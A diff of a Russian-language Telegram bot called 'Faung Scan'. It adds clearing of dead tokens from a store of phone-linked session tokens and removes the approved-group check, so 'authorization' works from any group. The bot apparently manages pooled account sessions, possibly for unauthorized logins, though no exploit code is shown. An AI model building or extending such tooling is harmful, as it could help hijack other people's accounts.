@@ -41,7 +41,6 @@ async def init_db():
     global db_pool
     db_pool = await asyncpg.create_pool(DATABASE_URL)
     async with db_pool.acquire() as c:
-        await c.execute("CREATE TABLE IF NOT EXISTS approved_groups (group_id BIGINT PRIMARY KEY)")
         await c.execute("CREATE TABLE IF NOT EXISTS tokens (id SERIAL PRIMARY KEY, phone TEXT, token TEXT, alive BOOLEAN DEFAULT TRUE)")
         await c.execute("CREATE TABLE IF NOT EXISTS stats (id SERIAL PRIMARY KEY, user_id BIGINT, username TEXT, action TEXT, created_at TIMESTAMP DEFAULT NOW())")
 
@@ -58,6 +57,11 @@ async def save(tok):
         e = await c.fetchval("SELECT id FROM tokens WHERE token=$1", tok)
         if not e: await c.execute("INSERT INTO tokens(token) VALUES($1)", tok)
 
+async def clear_dead():
+    async with db_pool.acquire() as c:
+        r = await c.execute("DELETE FROM tokens WHERE alive=FALSE")
+        return int(r.split()[-1]) if r else 0
+
 async def log_stat(user_id, username, action):
     async with db_pool.acquire() as c:
         await c.execute("INSERT INTO stats(user_id, username, action) VALUES($1,$2,$3)", user_id, username, action)
@@ -69,18 +73,6 @@ async def get_counts():
         success = await c.fetchval("SELECT COUNT(*) FROM stats WHERE action='success'")
         today = await c.fetchval("SELECT COUNT(*) FROM stats WHERE action='success' AND created_at::date=CURRENT_DATE")
         return total, alive, success or 0, today or 0
-
-async def is_group_approved(gid):
-    async with db_pool.acquire() as c:
-        return await c.fetchval("SELECT 1 FROM approved_groups WHERE group_id=$1", gid)
-
-async def add_group(gid):
-    async with db_pool.acquire() as c:
-        await c.execute("INSERT INTO approved_groups VALUES($1) ON CONFLICT DO NOTHING", gid)
-
-async def remove_group(gid):
-    async with db_pool.acquire() as c:
-        await c.execute("DELETE FROM approved_groups WHERE group_id=$1", gid)
 
 async def get_today_stats():
     async with db_pool.acquire() as c:
@@ -103,7 +95,8 @@ async def start(msg: Message):
     )
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Добавить токены", callback_data="add_tokens")]
+        [InlineKeyboardButton(text="Добавить токены", callback_data="add_tokens")],
+        [InlineKeyboardButton(text="Очистить мёртвые сессии", callback_data="clear_dead")]
     ])
 
     await msg.answer(text, reply_markup=keyboard, parse_mode="HTML")
@@ -121,37 +114,49 @@ async def add_tokens_cb(callback: CallbackQuery):
     )
     await callback.answer()
 
+@dp.callback_query(lambda c: c.data == "clear_dead")
+async def clear_dead_cb(callback: CallbackQuery):
+    if callback.from_user.id not in ADMIN_IDS:
+        return await callback.answer("Доступ запрещён", show_alert=True)
+
+    count = await clear_dead()
+    if count == 0:
+        await callback.answer("Нет мёртвых сессий", show_alert=True)
+    else:
+        await callback.answer(f"Очищено {count} мёртвых сессий", show_alert=True)
+
+    total, alive, success, today = await get_counts()
+    dead = total - alive
+
+    text = (
+        f"🔐 <b>Faung Scan</b>\n\n"
+        f"В наличии токенов: <code>{total}</code>\n"
+        f"Авторизовано всего: <code>{success}</code>\n"
+        f"Авторизовано за сегодня: <code>{today}</code>\n"
+        f"Мёртвых токенов: <code>{dead}</code>"
+    )
+
+    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Добавить токены", callback_data="add_tokens")],
+        [InlineKeyboardButton(text="Очистить мёртвые сессии", callback_data="clear_dead")]
+    ]), parse_mode="HTML")
+
 @dp.message(Command("cancel"))
 async def cancel(msg: Message):
     if msg.from_user.id in ADMIN_IDS and msg.chat.type == "private":
         expecting_tokens.discard(msg.from_user.id)
         await msg.answer("❌ Загрузка токенов отменена.")
 
-@dp.message(Command("setup"))
-async def setup_cmd(msg: Message):
-    if msg.from_user.id not in ADMIN_IDS: return
-    try:
-        await add_group(int(msg.text.split()[1]))
-        await msg.answer("✅ Группа одобрена")
-    except:
-        await msg.answer("❌ /setup ID_группы")
-
-@dp.message(Command("unsetup"))
-async def unsetup_cmd(msg: Message):
-    if msg.from_user.id not in ADMIN_IDS: return
-    try:
-        await remove_group(int(msg.text.split()[1]))
-        await msg.answer("✅ Группа удалена из одобренных")
-    except:
-        await msg.answer("❌ /unsetup ID_группы")
-
 @dp.message(Command("stats"))
 async def stats_cmd(msg: Message):
     if msg.chat.type not in ("group","supergroup"): return
-    if not await is_group_approved(msg.chat.id): return
 
     rows = await get_today_stats()
     msk = datetime.now(ZoneInfo("Europe/Moscow")).strftime("%d.%m.%Y, %H:%M")
+
+    if not rows:
+        await msg.answer(f"📊 Стата за сегодня ({msk} МСК)\n\nНет данных")
+        return
 
     users = {}
     for r in rows:
@@ -186,7 +191,7 @@ async def handler(msg: Message):
             expecting_tokens.discard(msg.from_user.id)
             await msg.answer(
                 f"✅ Токены <code>{n}</code> добавлены в базу данных.\n\n"
-                f"<i>Можете начать авторизацию через одобренную группу</i>",
+                f"<i>Можете начать авторизацию через любую группу</i>",
                 parse_mode="HTML"
             )
         return
